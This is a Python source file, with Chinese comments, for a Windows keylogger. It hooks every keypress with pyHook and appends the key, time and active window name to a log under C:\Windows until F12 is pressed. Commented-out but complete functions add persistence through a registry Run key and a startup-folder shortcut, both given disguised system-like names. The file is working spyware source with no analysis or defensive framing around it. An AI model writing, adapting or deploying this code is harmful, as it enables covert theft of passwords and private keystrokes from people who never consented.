#!/usr/bin/env python
# -*- coding: utf-8 -*-
import pythoncom
import pyHook
import time,os,shutil,sys
import win32api
import win32con,pythoncom
#import win32com

'''def CreateLnkpath(filename,lnkname): 
    "创建快捷方式到启动项"   
    shortcut = pythoncom.CoCreateInstance(win32com.shell.shell.CLSID_ShellLink, None,pythoncom.CLSCTX_INPROC_SERVER, win32com.shell.shell.IID_IShellLink)    
    shortcut.SetPath(filename)    
    if os.path.splitext(lnkname)[-1] != '.lnk':    
        lnkname += ".lnk"    
    shortcut.QueryInterface(pythoncom.IID_IPersistFile).Save(lnkname,0) 
'''
'''
def addfile2autorun(path):
     "注册到启动项"
     runpath = "Software\Microsoft\Windows\CurrentVersion\Run"
     hKey = win32api.RegOpenKeyEx(win32con.HKEY_CURRENT_USER, runpath, 0, win32con.KEY_SET_VALUE)
     (filepath, filename) = os.path.split(path)
     win32api.RegSetValueEx(hKey, "WindowsInit", 0, win32con.REG_SZ, path)
     win32api.RegCloseKey(hKey)
'''
def onKeyboardEvent(event): 
     "处理键盘事件"   
     fobj.writelines('-' * 20 + 'Keyboard Begin' + '-' * 20 + '\n')
     fobj.writelines("Current Time:%s\n" % time.strftime("%a, %d %b %Y %H:%M:%S", time.gmtime()))
     fobj.writelines("WindowName:%s\n" % str(event.WindowName))
     fobj.writelines("Key:%s\n" % str(event.Key))
     fobj.writelines('-' * 20 + 'Keyboard End' + '-' * 20 + '\n')
     if str(event.Key)=='F12':#按下F12终止记录
	     fobj.close()    
	     win32api.PostQuitMessage()
     return True

if __name__ == "__main__": 
     path = os.path.abspath(sys.argv[0])
     #addfile2autorun(path)
     #CreateLnkpath(path,"C:\\Users\\Administrator\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\WinInit.exe")
     #打开日志文件  
     file_name = "C:\\Windows\\key_log.txt"  
     fobj = open(file_name,  'a')   
     fobj.writelines(' '*15+time.ctime()+'\n')
     #创建hook句柄  
     hm = pyHook.HookManager()  
     #监控键盘  
     hm.KeyDown = onKeyboardEvent  
     hm.HookKeyboard()  
     #循环获取消息  
     pythoncom.PumpMessages()    
     #关闭日志文件  
     fobj.close()   